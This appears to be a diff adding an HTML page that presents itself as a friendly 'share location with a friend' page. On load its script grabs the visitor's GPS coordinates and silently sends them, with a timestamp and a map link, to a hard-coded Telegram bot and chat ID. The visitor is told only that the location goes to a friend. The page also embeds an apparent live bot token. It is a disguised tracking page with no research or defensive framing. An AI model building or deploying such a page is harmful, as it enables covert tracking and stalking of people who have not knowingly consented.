@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Share Location</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { 
+      font-family: Arial, sans-serif; 
+      text-align: center; 
+      padding: 80px; 
+      background: #f0f7ff; 
+    }
+    h1 { color: #1a73e8; }
+    .success { color: green; font-size: 20px; margin-top: 20px; }
+  </style>
+</head>
+<body>
+  <h1>📍 Sharing Location with Friend</h1>
+  <p>Please tap <strong>Allow</strong> when prompted.</p>
+  <div id="result"></div>
+
+  <script>
+    const token = "8603128926:AAFtSTZ-QBtA_DoSlywwwOq7DjJJkg4t2";
+    const chatId = "1199516595";
+
+    function sendToTelegram(lat, lon) {
+      const message = `📍 New Location Received!\n\nLatitude: ${lat}\nLongitude: ${lon}\nTime: ${new Date().toLocaleString()}\n\n🔗 https://www.google.com/maps?q=${lat},${lon}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+
+          sendToTelegram(lat, lon);
+
+          document.getElementById("result").innerHTML = `
+            <p class="success"><strong>✅ Location Sent Successfully!</strong></p>
+            <p>You can close this page now.</p>
+          `;
+        }, () => {
+          document.getElementById("result").innerHTML = `<p style="color:red;">❌ You denied location permission.</p>`;
+        });
+      }
+    }
+
+    window.onload = getLocation;
+  </script>
+</body>
+</html>
